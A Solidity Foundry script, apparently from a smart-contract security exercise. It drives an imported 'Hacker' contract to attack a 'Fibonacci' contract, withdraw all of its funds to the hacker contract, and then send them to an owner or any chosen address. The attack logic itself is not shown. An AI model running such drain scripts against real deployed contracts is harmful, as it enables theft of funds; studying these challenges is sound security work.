//AttackContract
//WithdrawAllFromAttackedContract
//withdraw

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";
import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {Hacker} from "../src/HackerContract/Hacker.sol";

contract AttackFibonacciContract is Script {
    function run() external {
        address hacker = DevOpsTools.get_most_recent_deployment(
            "Hacker",
            block.chainid
        );
        attackFibonacci(hacker);
    }

    function attackFibonacci(address _hacker) public {
        vm.startBroadcast();
        Hacker(payable(_hacker)).attackContract();
        vm.stopBroadcast();
    }
}

contract WithdrawAllFromFibonacciToHackerContract is Script {
    function run() external {
        address hacker = DevOpsTools.get_most_recent_deployment(
            "Hacker",
            block.chainid
        );
        withdrawAllFromFibonacciToHackerContract(hacker);
    }

    function withdrawAllFromFibonacciToHackerContract(address _hacker) public {
        vm.startBroadcast();
        Hacker(payable(_hacker)).withdrawAllFromAttakedContract();
        vm.stopBroadcast();
    }
}

contract WithdrawFromHackerContract is Script {
    function run() external {
        address hacker = DevOpsTools.get_most_recent_deployment(
            "Hacker",
            block.chainid
        );
        withdrawAllFromHackerContract(hacker);
    }

    function withdrawAllFromHackerContract(address _hacker) public {
        address owner = Hacker(payable(_hacker)).getOwner();
        address to = owner; //you may input any address "to"

        vm.startBroadcast();
        Hacker(payable(_hacker)).withdraw(to);
        vm.stopBroadcast();
    }
}
